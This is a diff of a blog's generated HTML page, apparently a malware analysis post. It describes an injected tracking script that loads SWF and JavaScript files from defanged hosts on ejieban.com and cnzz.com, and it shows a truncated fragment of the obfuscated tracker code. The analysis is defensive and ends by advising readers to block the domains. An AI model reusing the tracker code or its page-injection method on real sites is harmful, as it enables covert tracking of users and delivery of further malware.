 </code></pre>
-
 <p>The second line is the client IP and country of origin of the request in Chinese.</p>
-
 <p><code>184.75.214.86_[Canada]:</code></p>
-
-<p><img src="/images/2016/10/translate.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/translate.PNG" alt=""></p>
 <p>The third is another array of SWFs, JavaScript files, commands and callback URLs. The decoded stat.swf will process this data and inject it into the page using the <code>fetchcallback</code> function (see above).</p>
-
 <p>Files of Note</p>
-
 <p><code>hxxp://s.ssl.qhimg.com/ssl/002735e0619ae0d8.swf</code></p>
-
-<p><img src="/images/2016/10/cookie_handler.png" alt="" /></p>
-
+<p><img src="/images/2016/10/cookie_handler.png" alt=""></p>
 <p>This SWF looks to provide <code>get/set/remove</code> functionality via the SharedObject API to the browser. This would allow Flash files injected in the same page to share data using memory instead of requiring a separate server for communication.</p>
-
 <p><code>hxxp://y3.ifengimg.com/ed787/0912/flashCookie.swf</code></p>
-
-<p><img src="/images/2016/10/flashCookie-swf_contents.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/flashCookie-swf_contents.PNG" alt=""></p>
 <p>This provides similar functionality via the SharedObject API.</p>
-
 <p>The data received from <code>stat.do</code> also references a few JavaScript files which appear to provide more tracking functionality.</p>
-
-<p><code>hxxp://b0.ejieban.com/clouder.js, 
-hxxp://i1.ejieban.com/clouder.js, 
-hxxp://31.ejieban.com/clouderx.js:</code></p>
-
+<p><code>hxxp://b0.ejieban.com/clouder.js,  hxxp://i1.ejieban.com/clouder.js,  hxxp://31.ejieban.com/clouderx.js:</code></p>
 <pre><code class="language-javascript">if (&quot;undefined&quot; == typeof(_c1oud3r)) {
     _c1oud3r = [];
     _c1oud3r.nodes = [];
@@ -647,13 +578,9 @@ if (&quot;undefined&quot; == typeof(_c1oud3r)) {
     } catch (e) {}
 }
 </code></pre>
-
 <h2 id="conclusions">Conclusions</h2>
-
 <p>This piece of malware does not appear to attempt privilege escalation or PE payload download (ala Neutrino EK). Its primary purpose appears to be tracking via <code>cnzz.com</code> and <code>ejieban.com</code> using <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>, Flash <code>&lt;object&gt;</code> injection.</p>
-
 <p>It&rsquo;s important to note that since it has the ability to inject arbitrary Flash and JavaScript data, it can deliver EKs or other malware. The tracking functionality could theoretically be used to target very specific clients by country, IP range or any of the other meta data it collects.</p>
-
 <p>It&rsquo;s probably a good idea to block the domains above.</p>
 
             </div>
@@ -676,7 +603,7 @@ if (&quot;undefined&quot; == typeof(_c1oud3r)) {
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2020</span>
+            <span>&copy; 2021</span>
             
                 <span><a href="/">Bit Therapy</a></span>
             
@@ -704,7 +631,7 @@ if (&quot;undefined&quot; == typeof(_c1oud3r)) {
 
 
 
-<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
 
 
 
